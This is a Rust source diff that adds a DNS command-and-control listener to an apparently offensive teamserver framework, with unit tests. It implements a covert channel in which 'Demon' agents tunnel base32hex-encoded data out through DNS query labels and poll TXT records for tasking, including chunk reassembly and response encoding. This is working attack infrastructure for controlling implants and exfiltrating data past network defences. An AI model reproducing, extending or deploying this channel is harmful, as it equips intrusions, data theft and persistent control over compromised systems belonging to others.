@@ -1,9 +1,10 @@
 //! Listener lifecycle management for the teamserver.
 
-use std::collections::BTreeMap;
+use std::collections::{BTreeMap, HashMap};
 use std::io;
 use std::net::IpAddr;
 use std::sync::Arc;
+use std::time::Instant;
 
 use axum::body::{Body, to_bytes};
 use axum::extract::State;
@@ -35,7 +36,7 @@ use red_cell_common::tls::{
     TlsKeyAlgorithm, install_default_crypto_provider, resolve_tls_identity,
 };
 use red_cell_common::{
-    ExternalListenerConfig, HttpListenerConfig, HttpListenerProxyConfig,
+    DnsListenerConfig, ExternalListenerConfig, HttpListenerConfig, HttpListenerProxyConfig,
     HttpListenerResponseConfig, ListenerConfig, ListenerProtocol, SmbListenerConfig,
 };
 use serde::{Deserialize, Serialize};
@@ -43,7 +44,7 @@ use serde_json::Value;
 use time::OffsetDateTime;
 use time::format_description::well_known::Rfc3339;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
-use tokio::net::TcpListener;
+use tokio::net::{TcpListener, UdpSocket};
 use tokio::sync::{Mutex, RwLock};
 use tokio::task::JoinHandle;
 use tracing::debug;
@@ -167,6 +168,31 @@ impl ListenerSummary {
                     "Endpoint".to_owned(),
                     serde_json::Value::String(config.endpoint.clone()),
                 );
+            }
+            ListenerConfig::Dns(config) => {
+                info.extra
+                    .insert("Host".to_owned(), serde_json::Value::String(config.host_bind.clone()));
+                info.extra.insert(
+                    "Port".to_owned(),
+                    serde_json::Value::String(config.port_bind.to_string()),
+                );
+                info.extra
+                    .insert("Info".to_owned(), serde_json::Value::String(config.domain.clone()));
+                info.extra.insert(
+                    "Error".to_owned(),
+                    self.state.last_error.clone().map_or_else(
+                        || serde_json::Value::String(String::new()),
+                        serde_json::Value::String,
+                    ),
+                );
+                info.extra
+                    .insert("Domain".to_owned(), serde_json::Value::String(config.domain.clone()));
+                info.extra.insert(
+                    "RecordTypes".to_owned(),
+                    serde_json::Value::String(config.record_types.join(",")),
+                );
+                info.host_bind = Some(config.host_bind.clone());
+                info.port_bind = Some(config.port_bind.to_string());
             }
         }
 
@@ -589,6 +615,21 @@ pub fn listener_config_from_operator(
             name: name.to_owned(),
             endpoint: required_extra_string(info, "Endpoint")?,
         })),
+        Ok(ListenerProtocol::Dns) => Ok(ListenerConfig::from(DnsListenerConfig {
+            name: name.to_owned(),
+            host_bind: info
+                .host_bind
+                .as_deref()
+                .and_then(|value| optional_trimmed(Some(value)))
+                .unwrap_or_else(|| "0.0.0.0".to_owned()),
+            port_bind: parse_u16("PortBind", info.port_bind.as_deref())?,
+            domain: required_extra_string(info, "Domain")?,
+            record_types: split_csv(
+                info.extra.get("RecordTypes").and_then(serde_json::Value::as_str),
+            ),
+            kill_date: None,
+            working_hours: None,
+        })),
         Err(error) => Err(ListenerManagerError::InvalidConfig { message: error.to_string() }),
     }
 }
@@ -699,6 +740,7 @@ fn operator_status(status: ListenerStatus) -> &'static str {
 fn operator_protocol_name(config: &ListenerConfig) -> String {
     match config {
         ListenerConfig::Http(config) if config.secure => "Https".to_owned(),
+        ListenerConfig::Dns(_) => "Dns".to_owned(),
         _ => config.protocol().as_str().to_owned(),
     }
 }
@@ -751,6 +793,17 @@ fn profile_listener_configs(profile: &Profile) -> Vec<ListenerConfig> {
         ListenerConfig::from(ExternalListenerConfig {
             name: config.name,
             endpoint: config.endpoint,
+        })
+    }));
+    listeners.extend(profile.listeners.dns.iter().cloned().map(|config| {
+        ListenerConfig::from(DnsListenerConfig {
+            name: config.name,
+            host_bind: config.host_bind,
+            port_bind: config.port_bind,
+            domain: config.domain,
+            record_types: config.record_types,
+            kill_date: config.kill_date,
+            working_hours: config.working_hours,
         })
     }));
     listeners
@@ -1216,8 +1269,517 @@ impl ListenerManager {
             ListenerConfig::External(_) => Ok(tokio::spawn(async move {
                 std::future::pending::<()>().await;
             })),
+            ListenerConfig::Dns(config) => {
+                spawn_dns_listener_runtime(config, self.agent_registry.clone(), self.events.clone())
+                    .await
+            }
         }
     }
+}
+
+// ── DNS C2 Listener ──────────────────────────────────────────────────────────
+
+/// DNS wire-format header length in bytes.
+const DNS_HEADER_LEN: usize = 12;
+/// DNS record type for TXT records.
+const DNS_TYPE_TXT: u16 = 16;
+/// DNS record type for A records.
+const DNS_TYPE_A: u16 = 1;
+/// DNS record class IN.
+const DNS_CLASS_IN: u16 = 1;
+/// DNS flag: Query/Response bit.
+const DNS_FLAG_QR: u16 = 0x8000;
+/// DNS flag: Authoritative Answer bit.
+const DNS_FLAG_AA: u16 = 0x0400;
+/// DNS RCODE: No Error.
+const DNS_RCODE_NOERROR: u16 = 0;
+/// DNS RCODE: Refused.
+const DNS_RCODE_REFUSED: u16 = 5;
+/// Maximum age in seconds before a pending DNS upload is discarded.
+const DNS_UPLOAD_TIMEOUT_SECS: u64 = 120;
+/// Maximum response chunk size in bytes (encoded as base32hex in a TXT string).
+/// 200 base32hex chars × 5 bits ÷ 8 = 125 bytes.
+const DNS_RESPONSE_CHUNK_BYTES: usize = 125;
+/// Base32hex alphabet (RFC 4648 §7): 0-9 followed by A-V.
+const BASE32HEX_ALPHABET: &[u8; 32] = b"0123456789ABCDEFGHIJKLMNOPQRSTUV";
+
+/// In-progress multi-chunk upload reassembly buffer for a DNS C2 agent.
+#[derive(Debug)]
+struct DnsPendingUpload {
+    /// Received chunks indexed by sequence number.
+    chunks: HashMap<u16, Vec<u8>>,
+    /// Total number of expected chunks.
+    total: u16,
+    /// Timestamp of the first chunk (for expiry tracking).
+    received_at: Instant,
+}
+
+/// Pre-chunked C2 response ready to be polled by a DNS agent.
+#[derive(Debug)]
+struct DnsPendingResponse {
+    /// Base32hex-encoded response chunks.
+    chunks: Vec<String>,
+}
+
+/// Shared runtime state for the DNS C2 listener.
+///
+/// # DNS C2 Protocol
+///
+/// All DNS queries targeting the configured [`DnsListenerConfig::domain`] are
+/// treated as C2 traffic. Two query sub-types are supported:
+///
+/// ## Upload (agent → teamserver)
+///
+/// ```text
+/// <B32HEX-CHUNK>.<SEQ>-<TOTAL>-<AGENTID>.up.<DOMAIN>
+/// ```
+///
+/// * `B32HEX-CHUNK` — base32hex-encoded data slice (max 39 bytes per label)
+/// * `SEQ` — zero-based hex chunk index
+/// * `TOTAL` — hex total chunk count
+/// * `AGENTID` — 8-character lowercase hex agent identifier
+///
+/// The listener acknowledges each chunk with a TXT response:
+/// * `ok`  — chunk stored; more chunks expected
+/// * `ack` — all chunks received and the Demon packet was processed
+/// * `err` — reassembly or Demon protocol error
+///
+/// ## Download (teamserver → agent)
+///
+/// ```text
+/// <SEQ>-<AGENTID>.dn.<DOMAIN>
+/// ```
+///
+/// The server responds with a TXT record:
+/// * `wait`              — no response queued for this agent
+/// * `<TOTAL> <B32HEX>` — total chunk count and the requested chunk
+/// * `done`              — `SEQ` is past the end of the response
+#[derive(Debug)]
+struct DnsListenerState {
+    config: DnsListenerConfig,
+    registry: AgentRegistry,
+    parser: DemonPacketParser,
+    events: EventBus,
+    /// Pending uploads keyed by agent ID.
+    uploads: Mutex<HashMap<u32, DnsPendingUpload>>,
+    /// Pending responses keyed by agent ID.
+    responses: Mutex<HashMap<u32, DnsPendingResponse>>,
+}
+
+impl DnsListenerState {
+    fn new(config: &DnsListenerConfig, registry: AgentRegistry, events: EventBus) -> Self {
+        Self {
+            config: config.clone(),
+            registry: registry.clone(),
+            parser: DemonPacketParser::new(registry),
+            events,
+            uploads: Mutex::new(HashMap::new()),
+            responses: Mutex::new(HashMap::new()),
+        }
+    }
+
+    async fn handle_dns_packet(&self, buf: &[u8], peer_ip: &str) -> Option<Vec<u8>> {
+        let query = parse_dns_query(buf)?;
+
+        // Only handle A and TXT queries
+        if query.qtype != DNS_TYPE_A && query.qtype != DNS_TYPE_TXT {
+            return Some(build_dns_refused_response(query.id));
+        }
+
+        let c2_query = parse_dns_c2_query(&query.labels, &self.config.domain)?;
+
+        match c2_query {
+            DnsC2Query::Upload { agent_id, seq, total, data } => {
+                let txt = self.handle_upload(agent_id, seq, total, data, peer_ip).await;
+                Some(build_dns_txt_response(query.id, &query.qname_raw, txt.as_bytes()))
+            }
+            DnsC2Query::Download { agent_id, seq } => {
+                let txt = self.handle_download(agent_id, seq).await;
+                Some(build_dns_txt_response(query.id, &query.qname_raw, txt.as_bytes()))
+            }
+        }
+    }
+
+    async fn handle_upload(
+        &self,
+        agent_id: u32,
+        seq: u16,
+        total: u16,
+        data: Vec<u8>,
+        peer_ip: &str,
+    ) -> &'static str {
+        let Some(assembled) = self.try_assemble_upload(agent_id, seq, total, data).await else {
+            return "ok";
+        };
+
+        if !is_valid_demon_callback_request(&assembled) {
+            warn!(
+                listener = %self.config.name,
+                agent_id = format_args!("{agent_id:08X}"),
+                "dns upload produced invalid demon packet; discarding"
+            );
+            return "err";
+        }
+
+        match process_demon_transport(
+            &self.config.name,
+            &self.registry,
+            &self.parser,
+            &self.events,
+            &assembled,
+            peer_ip.to_owned(),
+        )
+        .await
+        {
+            Ok(response) => {
+                if !response.payload.is_empty() {
+                    let chunks = chunk_response_to_b32hex(&response.payload);
+                    self.responses.lock().await.insert(agent_id, DnsPendingResponse { chunks });
+                }
+                "ack"
+            }
+            Err(error) => {
+                warn!(
+                    listener = %self.config.name,
+                    agent_id = format_args!("{agent_id:08X}"),
+                    %error,
+                    "dns upload demon processing failed"
+                );
+                "err"
+            }
+        }
+    }
+
+    async fn handle_download(&self, agent_id: u32, seq: u16) -> String {
+        let responses = self.responses.lock().await;
+        match responses.get(&agent_id) {
+            None => "wait".to_owned(),
+            Some(pending) => {
+                let idx = usize::from(seq);
+                let total = pending.chunks.len();
+                if idx >= total {
+                    "done".to_owned()
+                } else {
+                    format!("{} {}", total, pending.chunks[idx])
+                }
+            }
+        }
+    }
+
+    /// Try to assemble a complete upload from buffered chunks.
+    ///
+    /// Returns `Some(bytes)` when all `total` chunks are present, `None` when more chunks
+    /// are still expected.
+    async fn try_assemble_upload(
+        &self,
+        agent_id: u32,
+        seq: u16,
+        total: u16,
+        data: Vec<u8>,
+    ) -> Option<Vec<u8>> {
+        let mut uploads = self.uploads.lock().await;
+
+        // Expire stale entries
+        uploads
+            .retain(|_, pending| pending.received_at.elapsed().as_secs() < DNS_UPLOAD_TIMEOUT_SECS);
+
+        let entry = uploads.entry(agent_id).or_insert_with(|| DnsPendingUpload {
+            chunks: HashMap::new(),
+            total,
+            received_at: Instant::now(),
+        });
+        entry.chunks.insert(seq, data);
+
+        let expected = entry.total;
+        if entry.chunks.len() < usize::from(expected) {
+            return None;
+        }
+
+        // All chunks present — assemble in order
+        let mut assembled = Vec::new();
+        for i in 0..expected {
+            match entry.chunks.get(&i) {
+                Some(chunk) => assembled.extend_from_slice(chunk),
+                None => {
+                    warn!(
+                        listener = %self.config.name,
+                        agent_id = format_args!("{agent_id:08X}"),
+                        "dns upload missing chunk {i}/{expected}; discarding"
+                    );
+                    uploads.remove(&agent_id);
+                    return None;
+                }
+            }
+        }
+        uploads.remove(&agent_id);
+        Some(assembled)
+    }
+}
+
+/// A parsed DNS C2 query from a Demon agent.
+enum DnsC2Query {
+    /// Upload chunk: `<b32hex-data>.<seq>-<total>-<agentid>.up.<domain>`
+    Upload { agent_id: u32, seq: u16, total: u16, data: Vec<u8> },
+    /// Download request: `<seq>-<agentid>.dn.<domain>`
+    Download { agent_id: u32, seq: u16 },
+}
+
+/// A minimally parsed DNS query sufficient for C2 processing.
+struct ParsedDnsQuery {
+    id: u16,
+    /// Raw wire-format QNAME bytes (including final zero label).
+    qname_raw: Vec<u8>,
+    /// Lowercase parsed labels.
+    labels: Vec<String>,
+    qtype: u16,
+}
+
+/// Parse the first question from a raw DNS UDP payload.
+///
+/// Returns `None` if the packet is malformed or has ≠ 1 question.
+fn parse_dns_query(buf: &[u8]) -> Option<ParsedDnsQuery> {
+    if buf.len() < DNS_HEADER_LEN {
+        return None;
+    }
+
+    let id = u16::from_be_bytes([buf[0], buf[1]]);
+    let qdcount = u16::from_be_bytes([buf[4], buf[5]]);
+
+    if qdcount != 1 {
+        return None;
+    }
+
+    let mut pos = DNS_HEADER_LEN;
+    let qname_start = pos;
+    let mut labels = Vec::new();
+
+    loop {
+        if pos >= buf.len() {
+            return None;
+        }
+        let len = usize::from(buf[pos]);
+        if len == 0 {
+            pos += 1;
+            break;
+        }
+        // Reject DNS pointer compression in queries (not expected in client queries)
+        if len & 0xC0 != 0 {
+            return None;
+        }
+        pos += 1;
+        if pos + len > buf.len() {
+            return None;
+        }
+        let label = std::str::from_utf8(&buf[pos..pos + len]).ok()?.to_ascii_lowercase();
+        labels.push(label);
+        pos += len;
+    }
+
+    if pos + 4 > buf.len() {
+        return None;
+    }
+    let qtype = u16::from_be_bytes([buf[pos], buf[pos + 1]]);
+    let qname_raw = buf[qname_start..pos].to_vec();
+
+    Some(ParsedDnsQuery { id, qname_raw, labels, qtype })
+}
+
+/// Parse DNS labels into a [`DnsC2Query`] if they match the expected C2 format.
+///
+/// Expected formats (labels listed from leftmost to rightmost, domain stripped):
+/// * Upload:   `["<b32>", "<seq>-<total>-<aid>", "up"]`
+/// * Download: `["<seq>-<aid>",                  "dn"]`
+fn parse_dns_c2_query(labels: &[String], domain: &str) -> Option<DnsC2Query> {
+    // Strip the domain suffix labels from the right
+    let domain_labels: Vec<&str> = domain.split('.').collect();
+    let domain_label_count = domain_labels.len();
+
+    if labels.len() <= domain_label_count {
+        return None;
+    }
+
+    // Verify domain suffix matches
+    let suffix = &labels[labels.len() - domain_label_count..];
+    if suffix.iter().zip(domain_labels.iter()).any(|(a, b)| a != b) {
+        return None;
+    }
+
+    let c2_labels = &labels[..labels.len() - domain_label_count];
+
+    match c2_labels {
+        // Upload: [b32data, "seq-total-aid", "up"]
+        [b32data, ctrl, up] if up == "up" => {
+            let parts: Vec<&str> = ctrl.splitn(3, '-').collect();
+            if parts.len() != 3 {
+                return None;
+            }
+            let seq = u16::from_str_radix(parts[0], 16).ok()?;
+            let total = u16::from_str_radix(parts[1], 16).ok()?;
+            let agent_id = u32::from_str_radix(parts[2], 16).ok()?;
+            let data = base32hex_decode(b32data)?;
+            Some(DnsC2Query::Upload { agent_id, seq, total, data })
+        }
+        // Download: ["seq-aid", "dn"]
+        [ctrl, dn] if dn == "dn" => {
+            let parts: Vec<&str> = ctrl.splitn(2, '-').collect();
+            if parts.len() != 2 {
+                return None;
+            }
+            let seq = u16::from_str_radix(parts[0], 16).ok()?;
+            let agent_id = u32::from_str_radix(parts[1], 16).ok()?;
+            Some(DnsC2Query::Download { agent_id, seq })
+        }
+        _ => None,
+    }
+}
+
+/// Encode `data` as uppercase base32hex (RFC 4648 §7) with no padding.
+fn base32hex_encode(data: &[u8]) -> String {
+    let mut result = String::with_capacity((data.len() * 8).div_ceil(5));
+    let mut buf: u32 = 0;
+    let mut bits: u8 = 0;
+
+    for &byte in data {
+        buf = (buf << 8) | u32::from(byte);
+        bits += 8;
+        while bits >= 5 {
+            bits -= 5;
+            result.push(char::from(BASE32HEX_ALPHABET[((buf >> bits) & 0x1F) as usize]));
+        }
+    }
+
+    if bits > 0 {
+        result.push(char::from(BASE32HEX_ALPHABET[((buf << (5 - bits)) & 0x1F) as usize]));
+    }
+
+    result
+}
+
+/// Decode a base32hex string (case-insensitive, no padding) into bytes.
+///
+/// Returns `None` if any character is outside the base32hex alphabet.
+fn base32hex_decode(s: &str) -> Option<Vec<u8>> {
+    let mut result = Vec::with_capacity(s.len() * 5 / 8);
+    let mut buf: u32 = 0;
+    let mut bits: u8 = 0;
+
+    for ch in s.bytes() {
+        let val = match ch {
+            b'0'..=b'9' => u32::from(ch - b'0'),
+            b'a'..=b'v' => u32::from(ch - b'a' + 10),
+            b'A'..=b'V' => u32::from(ch - b'A' + 10),
+            _ => return None,
+        };
+        buf = (buf << 5) | val;
+        bits += 5;
+        if bits >= 8 {
+            bits -= 8;
+            result.push((buf >> bits) as u8);
+        }
+    }
+
+    Some(result)
+}
+
+/// Split a Demon response payload into base32hex-encoded chunks for DNS delivery.
+fn chunk_response_to_b32hex(payload: &[u8]) -> Vec<String> {
+    payload.chunks(DNS_RESPONSE_CHUNK_BYTES).map(base32hex_encode).collect()
+}
+
+/// Build a DNS TXT response for `query_id` carrying `txt_data`.
+///
+/// The question section is reconstructed from `qname_raw` (which already includes the
+/// zero-label terminator), and a single answer TXT record is appended using a pointer
+/// back to offset 12 (the start of the question QNAME).
+fn build_dns_txt_response(query_id: u16, qname_raw: &[u8], txt_data: &[u8]) -> Vec<u8> {
+    // Clamp TXT data to 255 bytes (single TXT string limit per RFC 1035).
+    let txt_data = &txt_data[..txt_data.len().min(255)];
+    // RDLENGTH = 1 (length byte) + txt_data.len()
+    let rdlength = u16::try_from(1 + txt_data.len()).unwrap_or(u16::MAX);
+
+    let mut response = Vec::with_capacity(
+        DNS_HEADER_LEN + qname_raw.len() + 1 + 4 + 2 + 2 + 2 + 4 + 2 + 1 + txt_data.len(),
+    );
+
+    // Header (12 bytes)
+    response.extend_from_slice(&query_id.to_be_bytes());
+    let flags: u16 = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_NOERROR;
+    response.extend_from_slice(&flags.to_be_bytes());
+    response.extend_from_slice(&1u16.to_be_bytes()); // qdcount = 1
+    response.extend_from_slice(&1u16.to_be_bytes()); // ancount = 1
+    response.extend_from_slice(&0u16.to_be_bytes()); // nscount = 0
+    response.extend_from_slice(&0u16.to_be_bytes()); // arcount = 0
+
+    // Question section: QNAME (includes zero-label terminator) + QTYPE + QCLASS
+    // qname_raw includes the zero-label terminator as captured by parse_dns_query.
+    response.extend_from_slice(qname_raw);
+    response.extend_from_slice(&DNS_TYPE_TXT.to_be_bytes()); // QTYPE
+    response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes()); // QCLASS
+
+    // Answer RR
+    // NAME: pointer to offset 12 (start of QNAME in question), encoded as 0xC00C
+    response.extend_from_slice(&[0xC0, 0x0C]);
+    response.extend_from_slice(&DNS_TYPE_TXT.to_be_bytes()); // TYPE = TXT
+    response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes()); // CLASS = IN
+    response.extend_from_slice(&0u32.to_be_bytes()); // TTL = 0 (no caching)
+    response.extend_from_slice(&rdlength.to_be_bytes()); // RDLENGTH
+    response.push(txt_data.len() as u8); // TXT string length byte
+    response.extend_from_slice(txt_data); // TXT string data
+
+    response
+}
+
+/// Build a DNS REFUSED response for `query_id`.
+fn build_dns_refused_response(query_id: u16) -> Vec<u8> {
+    let mut response = vec![0u8; DNS_HEADER_LEN];
+    response[0] = (query_id >> 8) as u8;
+    response[1] = query_id as u8;
+    let flags: u16 = DNS_FLAG_QR | DNS_RCODE_REFUSED;
+    response[2] = (flags >> 8) as u8;
+    response[3] = flags as u8;
+    response
+}
+
+async fn spawn_dns_listener_runtime(
+    config: &DnsListenerConfig,
+    registry: AgentRegistry,
+    events: EventBus,
+) -> Result<JoinHandle<()>, ListenerManagerError> {
+    let state = Arc::new(DnsListenerState::new(config, registry, events));
+    let addr = format!("{}:{}", config.host_bind, config.port_bind);
+
+    let socket =
+        UdpSocket::bind(&addr).await.map_err(|error| ListenerManagerError::StartFailed {
+            name: config.name.clone(),
+            message: format!("failed to bind DNS UDP socket {addr}: {error}"),
+        })?;
+    let socket = Arc::new(socket);
+
+    Ok(tokio::spawn(async move {
+        let mut buf = vec![0u8; 4096];
+        loop {
+            let (len, peer) = match socket.recv_from(&mut buf).await {
+                Ok(result) => result,
+                Err(error) => {
+                    warn!(listener = %state.config.name, %error, "dns listener recv error");
+                    break;
+                }
+            };
+
+            let packet = buf[..len].to_vec();
+            let state = state.clone();
+            let socket = socket.clone();
+            let peer_ip = peer.ip().to_string();
+
+            tokio::spawn(async move {
+                if let Some(response) = state.handle_dns_packet(&packet, &peer_ip).await {
+                    if let Err(error) = socket.send_to(&response, peer).await {
+                        warn!(listener = %state.config.name, %error, "dns listener send error");
+                    }
+                }
+            });
+        }
+    }))
 }
 
 async fn build_http_tls_config(
@@ -2454,5 +3016,243 @@ mod tests {
     fn add_length_prefixed_utf16(buf: &mut Vec<u8>, value: &str) {
         let encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_le_bytes).collect();
         add_length_prefixed_bytes(buf, &encoded);
+    }
+
+    // ── DNS C2 unit tests ─────────────────────────────────────────────────────
+
+    use super::{
+        base32hex_decode, base32hex_encode, build_dns_txt_response, chunk_response_to_b32hex,
+        parse_dns_c2_query, parse_dns_query, DNS_HEADER_LEN, DNS_TYPE_TXT,
+    };
+    use tokio::net::UdpSocket as TokioUdpSocket;
+
+    fn free_udp_port() -> u16 {
+        // Bind on :0 to let the OS pick an ephemeral port, then return it.
+        let sock = std::net::UdpSocket::bind("127.0.0.1:0")
+            .expect("failed to bind ephemeral UDP socket");
+        sock.local_addr().expect("failed to read local addr").port()
+    }
+
+    fn dns_listener_config(name: &str, port: u16, domain: &str) -> ListenerConfig {
+        ListenerConfig::from(red_cell_common::DnsListenerConfig {
+            name: name.to_owned(),
+            host_bind: "127.0.0.1".to_owned(),
+            port_bind: port,
+            domain: domain.to_owned(),
+            record_types: vec!["TXT".to_owned()],
+            kill_date: None,
+            working_hours: None,
+        })
+    }
+
+    /// Build a minimal DNS TXT query packet for `qname`.
+    fn build_dns_txt_query(id: u16, qname: &str) -> Vec<u8> {
+        let mut buf = Vec::new();
+        // Header
+        buf.extend_from_slice(&id.to_be_bytes());
+        buf.extend_from_slice(&0x0100u16.to_be_bytes()); // flags: QR=0, RD=1
+        buf.extend_from_slice(&1u16.to_be_bytes()); // qdcount
+        buf.extend_from_slice(&0u16.to_be_bytes()); // ancount
+        buf.extend_from_slice(&0u16.to_be_bytes()); // nscount
+        buf.extend_from_slice(&0u16.to_be_bytes()); // arcount
+        // QNAME
+        for label in qname.split('.') {
+            buf.push(label.len() as u8);
+            buf.extend_from_slice(label.as_bytes());
+        }
+        buf.push(0); // zero terminator
+        buf.extend_from_slice(&DNS_TYPE_TXT.to_be_bytes()); // QTYPE
+        buf.extend_from_slice(&1u16.to_be_bytes()); // QCLASS IN
+        buf
+    }
+
+    #[test]
+    fn base32hex_encode_and_decode_round_trip() {
+        let cases: &[&[u8]] = &[
+            b"hello",
+            b"",
+            b"\x00\xff\xaa",
+            b"The quick brown fox jumps over the lazy dog",
+        ];
+        for &data in cases {
+            let encoded = base32hex_encode(data);
+            let decoded = base32hex_decode(&encoded).expect("decode failed");
+            assert_eq!(decoded, data, "round trip failed for {data:?}");
+        }
+    }
+
+    #[test]
+    fn base32hex_decode_is_case_insensitive() {
+        let lower = base32hex_decode("c9gq6u").expect("lower decode failed");
+        let upper = base32hex_decode("C9GQ6U").expect("upper decode failed");
+        assert_eq!(lower, upper);
+    }
+
+    #[test]
+    fn base32hex_decode_rejects_invalid_characters() {
+        assert!(base32hex_decode("XY!").is_none());
+        assert!(base32hex_decode("ZZZZ").is_none()); // Z is not in base32hex
+    }
+
+    #[test]
+    fn parse_dns_query_extracts_labels_and_type() {
+        let qname = "data.0-1-deadbeef.up.c2.example.com";
+        let packet = build_dns_txt_query(0x1234, qname);
+        let parsed = parse_dns_query(&packet).expect("parse failed");
+        assert_eq!(parsed.id, 0x1234);
+        assert_eq!(parsed.qtype, DNS_TYPE_TXT);
+        assert_eq!(
+            parsed.labels,
+            &["data", "0-1-deadbeef", "up", "c2", "example", "com"]
+        );
+        // qname_raw includes zero terminator
+        assert_eq!(*parsed.qname_raw.last().unwrap(), 0);
+    }
+
+    #[test]
+    fn parse_dns_query_rejects_short_packets() {
+        assert!(parse_dns_query(&[0u8; 3]).is_none());
+    }
+
+    #[test]
+    fn parse_dns_query_rejects_multiple_questions() {
+        let mut packet = build_dns_txt_query(1, "foo.bar");
+        // Set qdcount = 2
+        packet[4] = 0;
+        packet[5] = 2;
+        assert!(parse_dns_query(&packet).is_none());
+    }
+
+    #[test]
+    fn parse_dns_c2_query_recognises_upload_query() {
+        let data = b"hello";
+        let b32 = base32hex_encode(data);
+        let labels: Vec<String> = [b32.as_str(), "0-1-deadbeef", "up", "c2", "example", "com"]
+            .iter()
+            .map(|s| s.to_string())
+            .collect();
+        let result = parse_dns_c2_query(&labels, "c2.example.com");
+        let Some(super::DnsC2Query::Upload { agent_id, seq, total, data: decoded }) = result
+        else {
+            panic!("expected Upload variant");
+        };
+        assert_eq!(agent_id, 0xDEAD_BEEF);
+        assert_eq!(seq, 0);
+        assert_eq!(total, 1);
+        assert_eq!(decoded, b"hello");
+    }
+
+    #[test]
+    fn parse_dns_c2_query_recognises_download_query() {
+        let labels: Vec<String> =
+            ["3-cafebabe", "dn", "c2", "example", "com"].iter().map(|s| s.to_string()).collect();
+        let result = parse_dns_c2_query(&labels, "c2.example.com");
+        let Some(super::DnsC2Query::Download { agent_id, seq }) = result else {
+            panic!("expected Download variant");
+        };
+        assert_eq!(agent_id, 0xCAFE_BABE);
+        assert_eq!(seq, 3);
+    }
+
+    #[test]
+    fn parse_dns_c2_query_rejects_wrong_domain() {
+        let labels: Vec<String> =
+            ["data", "0-1-deadbeef", "up", "other", "domain", "com"]
+                .iter()
+                .map(|s| s.to_string())
+                .collect();
+        assert!(parse_dns_c2_query(&labels, "c2.example.com").is_none());
+    }
+
+    #[test]
+    fn build_dns_txt_response_produces_parseable_answer() {
+        let packet = build_dns_txt_query(0xABCD, "test.c2.example.com");
+        let parsed = parse_dns_query(&packet).expect("parse failed");
+        let txt = b"ok";
+        let response = build_dns_txt_response(parsed.id, &parsed.qname_raw, txt);
+
+        // Response must be at least header + question + answer
+        assert!(response.len() >= DNS_HEADER_LEN);
+        // QR bit set
+        assert!(response[2] & 0x80 != 0, "QR bit not set");
+        // ANCOUNT = 1
+        let ancount = u16::from_be_bytes([response[6], response[7]]);
+        assert_eq!(ancount, 1);
+    }
+
+    #[test]
+    fn chunk_response_splits_payload_into_base32hex_chunks() {
+        let payload = vec![0xABu8; 300]; // 300 bytes > 1 chunk (125 bytes each)
+        let chunks = chunk_response_to_b32hex(&payload);
+        assert_eq!(chunks.len(), 3); // ceil(300/125) = 3
+        // Each chunk decodes back to the expected slice
+        let mut reassembled = Vec::new();
+        for chunk in &chunks {
+            let decoded = base32hex_decode(chunk).expect("chunk decode failed");
+            reassembled.extend_from_slice(&decoded);
+        }
+        assert_eq!(reassembled, payload);
+    }
+
+    #[tokio::test]
+    async fn dns_listener_starts_and_responds_to_unknown_queries_with_refused() {
+        let port = free_udp_port();
+        let manager = manager().await.expect("manager creation failed");
+        let config = dns_listener_config("dns-test", port, "c2.example.com");
+        manager.create(config).await.expect("create failed");
+        manager.start("dns-test").await.expect("start failed");
+
+        // Brief delay for the listener to bind
+        sleep(Duration::from_millis(50)).await;
+
+        let client = TokioUdpSocket::bind("127.0.0.1:0").await.expect("client bind failed");
+        client.connect(format!("127.0.0.1:{port}")).await.expect("connect failed");
+
+        // Send a query for an unrecognised C2 domain — expect REFUSED
+        let packet = build_dns_txt_query(0x1111, "something.other.domain.com");
+        client.send(&packet).await.expect("send failed");
+
+        let mut buf = vec![0u8; 512];
+        tokio::time::timeout(Duration::from_secs(2), client.recv(&mut buf))
+            .await
+            .expect("no response received")
+            .expect("recv failed");
+
+        // RCODE should be 5 (REFUSED)
+        let rcode = buf[3] & 0x0F;
+        assert_eq!(rcode, 5, "expected REFUSED RCODE");
+    }
+
+    #[tokio::test]
+    async fn dns_listener_download_poll_returns_wait_when_no_response_queued() {
+        let port = free_udp_port();
+        let manager = manager().await.expect("manager creation failed");
+        let config = dns_listener_config("dns-wait", port, "c2.example.com");
+        manager.create(config).await.expect("create failed");
+        manager.start("dns-wait").await.expect("start failed");
+
+        sleep(Duration::from_millis(50)).await;
+
+        let client = TokioUdpSocket::bind("127.0.0.1:0").await.expect("client bind failed");
+        client.connect(format!("127.0.0.1:{port}")).await.expect("connect failed");
+
+        // Download poll for agent 0xDEADBEEF, seq 0
+        let qname = "0-deadbeef.dn.c2.example.com";
+        let packet = build_dns_txt_query(0x2222, qname);
+        client.send(&packet).await.expect("send failed");
+
+        let mut buf = vec![0u8; 512];
+        tokio::time::timeout(Duration::from_secs(2), client.recv(&mut buf))
+            .await
+            .expect("no response received")
+            .expect("recv failed");
+
+        // NOERROR (RCODE=0)
+        let rcode = buf[3] & 0x0F;
+        assert_eq!(rcode, 0, "expected NOERROR");
+
+        // ANCOUNT = 1
+        let ancount = u16::from_be_bytes([buf[6], buf[7]]);
+        assert_eq!(ancount, 1);
     }
 }
